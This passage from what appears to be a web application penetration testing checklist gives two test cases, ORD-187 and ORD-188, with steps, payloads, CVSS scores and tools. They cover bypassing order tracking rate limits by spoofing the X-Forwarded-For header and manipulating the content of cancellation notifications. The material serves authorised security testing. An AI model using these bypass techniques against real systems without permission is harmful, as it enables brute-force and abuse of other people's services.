| ORD-187 | Tracking API Rate Limit Bypass | Business Logic (WSTG-BUSL-05) | Order Tracking | 1. Send rapid tracking queries for different tracking IDs. 2. Check if rate limiting is implemented per-user or per-IP. 3. Try bypassing with X-Forwarded-For header. | Application must implement robust rate limiting that cannot be bypassed via header manipulation. | <code>Add X-Forwarded-For: 1.2.3.4 to bypass IP-based rate limiting on tracking queries</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| ORD-188 | Cancellation Notification Manipulation | Business Logic (WSTG-BUSL-02) | Order Cancellation | 1. Cancel an order. 2. Intercept the cancellation notification. 3. Check if notification content can be manipulated to mislead the user. | Application must generate cancellation notifications from server-side data without accepting user-controlled notification content. | <code>Modify notification_message or reason in cancellation request to inject misleading information</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
